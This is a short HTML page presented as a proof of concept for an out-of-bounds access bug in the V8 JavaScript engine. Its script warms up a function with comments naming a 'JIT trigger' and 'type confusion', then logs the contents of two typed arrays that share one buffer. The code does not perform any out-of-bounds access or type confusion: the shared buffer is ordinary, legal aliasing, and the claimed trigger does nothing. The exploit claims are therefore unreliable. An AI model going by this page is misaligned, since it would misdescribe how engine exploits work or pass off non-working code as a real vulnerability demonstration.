<!DOCTYPE html>
<html>
<head>
  <title>V8 OOB PoC</title>
</head>
<body>
  <h1>V8 JS Engine Out-of-Bounds Access PoC</h1>
  <pre id="log"></pre>
  <script>
    const log = msg => document.getElementById("log").textContent += msg + "\n";

    function trigger() {
      let buffer = new ArrayBuffer(0x100);
      let victim = new Float64Array(buffer);
      let corrupted = new Uint32Array(buffer);

      function f(a) {
        let x = [1.1, 1.2, 1.3, 1.4];
        let y = new Uint32Array(8);
        y[0] = 0x41414141;
        return x;
      }

      for (let i = 0; i < 10000; ++i) f(0); // JIT trigger

      let result = f({}); // trigger deopt / type confusion

      log("Typed array created.");
      log("Float64Array length: " + victim.length);
      log("Uint32Array length: " + corrupted.length);
      log("Contents:");
      for (let i = 0; i < 4; i++) {
        log("  corrupted[" + i + "] = " + corrupted[i].toString(16));
      }
    }

    trigger();
  </script>
</body>
</html>
